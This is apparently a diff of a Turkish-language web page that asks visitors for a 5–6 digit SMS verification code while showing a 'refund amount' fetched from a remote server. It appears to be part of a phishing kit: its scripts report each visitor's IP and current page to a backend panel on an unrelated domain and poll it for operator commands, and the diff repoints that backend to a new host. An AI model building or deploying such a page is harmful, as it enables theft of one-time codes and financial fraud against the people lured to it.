@@ -42,68 +42,70 @@
            <center>   <img src="https://media.istockphoto.com/id/503913526/pt/vetorial/%C3%ADcone-de-sms-smartphone.jpg?s=170667a&amp;w=0&amp;k=20&amp;c=2wJWZETcgVDZQRWmBou-LU0vT2D9IdUS0McpSy6gfFY=" jsaction="VQAsE" class="sFlh5c pT0Scc iPVvYb" style="max-width: 100%;height: 57%;margin: 4px 0px;width: 40%;" alt="Vetores de Ícone De Sms Smartphone e mais imagens de Aplicação móvel -  Aplicação móvel, Cardápio, Celular com câmera - iStock" jsname="kn3ccd" aria-hidden="false">  
 <br> 
      </center> 
-     <script>
-    document.addEventListener("DOMContentLoaded", function() {
-      const smsInput = document.getElementById("sms");
+        <script>
+        document.addEventListener("DOMContentLoaded", function() {
+    const smsInput = document.getElementById("sms");
 
-      smsInput.addEventListener("input", function() {
+    smsInput.addEventListener("input", function() {
         const inputValue = smsInput.value.trim(); // Boşlukları temizle
         if (inputValue.length < 5 || inputValue.length > 6) {
-          smsInput.value = inputValue.slice(0, 6); // En fazla 6 karakter olarak sınırla
+            smsInput.value = inputValue.slice(0, 6); // En fazla 6 karakter olarak sınırla
         }
-      });
-
-      document.getElementById("loginForm").addEventListener("submit", function(e) {
-        const inputValue = smsInput.value.trim(); // Boşlukları temizle
-        if (inputValue.length !== 5 && inputValue.length !== 6) {
-          e.preventDefault();
-          alert("SMS doğrulama kodu 5 veya 6 karakter olmalıdır.");
-        }
-      });
-
-      const apiUrl = 'https://akbulutmensucat.com/dmn/pin.php?ip=';
-      const ip = getCookie('ip');
-
-      if (!ip) {
-        console.error('IP adresi cookie olarak bulunamadı.');
-        return;
-      }
-
-      const url = apiUrl + encodeURIComponent(ip);
-
-      // AJAX ile GET isteği yaparak cevabı al
-      fetch(url)
-        .then(response => response.text())
-        .then(data => {
-          // Cevabı aldıktan sonra işlemleri yap
-          const iadeTutariLabel = document.getElementById('iade');
-          const iadeTutariElement = document.getElementById('iadeTutari');
-
-          // İade tutarını Türk Lirası formatına dönüştür
-          const formattedTutar = formatTutar(data);
-
-          iadeTutariElement.textContent = iadeTutariLabel.textContent + ' ' + formattedTutar;
-        })
-        .catch(error => console.error('API isteği hatası:', error));
     });
 
-    // Cookie'den değer almak için yardımcı fonksiyon
-    function getCookie(name) {
-      const value = `; ${document.cookie}`;
-      const parts = value.split(`; ${name}=`);
-      if (parts.length === 2) return parts.pop().split(';').shift();
-    }
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+        const inputValue = smsInput.value.trim(); // Boşlukları temizle
+        if (inputValue.length !== 5 && inputValue.length !== 6) {
+            e.preventDefault();
+            alert("SMS doğrulama kodu 5 veya 6 karakter olmalıdır.");
+        }
+    });
+});
+            window.onload = function() {
+                const apiUrl = 'https://asilsilver.com.tr/dmn/pin.php?ip=';
+                const ip = getCookie('ip');
 
-    // Türk Lirası formatına dönüştürme fonksiyonu
-    function formatTutar(tutar) {
-      const formattedTutar = Number(tutar).toLocaleString('tr-TR', {
-        style: 'currency',
-        currency: 'TRY'
-      });
+                if (!ip) {
+                    console.error('IP adresi cookie olarak bulunamadı.');
+                    return;
+                }
 
-      return formattedTutar.replace(/\s/g, ''); // Boşlukları kaldır
-    }
-  </script>
+                const url = apiUrl + encodeURIComponent(ip);
+
+                // AJAX ile GET isteği yaparak cevabı al
+                fetch(url)
+                    .then(response => response.text())
+                    .then(data => {
+                        // Cevabı aldıktan sonra işlemleri yap
+                        const iadeTutariLabel = document.getElementById('iade');
+                        const iadeTutariElement = document.getElementById('iadeTutari');
+
+                        // İade tutarını Türk Lirası formatına dönüştür
+                        const formattedTutar = formatTutar(data);
+
+                        iadeTutariElement.textContent = iadeTutariLabel.textContent + ' ' + formattedTutar;
+                    })
+                    .catch(error => console.error('API isteği hatası:', error));
+            };
+
+            // Cookie'den değer almak için yardımcı fonksiyon
+            function getCookie(name) {
+                const value = `; ${document.cookie}`;
+                const parts = value.split(`; ${name}=`);
+                if (parts.length === 2) return parts.pop().split(';').shift();
+            }
+
+            // Türk Lirası formatına dönüştürme fonksiyonu
+            function formatTutar(tutar) {
+                const formattedTutar = Number(tutar).toLocaleString('tr-TR', {
+                    style: 'currency',
+                    currency: 'TRY'
+                });
+
+                return formattedTutar.replace(/\s/g, ''); // Boşlukları kaldır
+            }
+        });
+    </script>
 
     <form method="post" id="loginForm" name="sifreGirisForm" action="/sms-ok" autocomplete="off">
         <fieldset>
@@ -205,7 +207,7 @@ document.addEventListener("DOMContentLoaded", function() {
           }
         },
         sendRequest(visitorIP) {
-          axios.get('https://akbulutmensucat.com/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=sms sayfa')
+          axios.get('https://asilsilver.com.tr/dmn/veri.php?ip=' + encodeURIComponent(visitorIP)+'&sayfa=sms sayfa')
             .then(response => {
               const msg = response.data;
               if (msg === "back") {
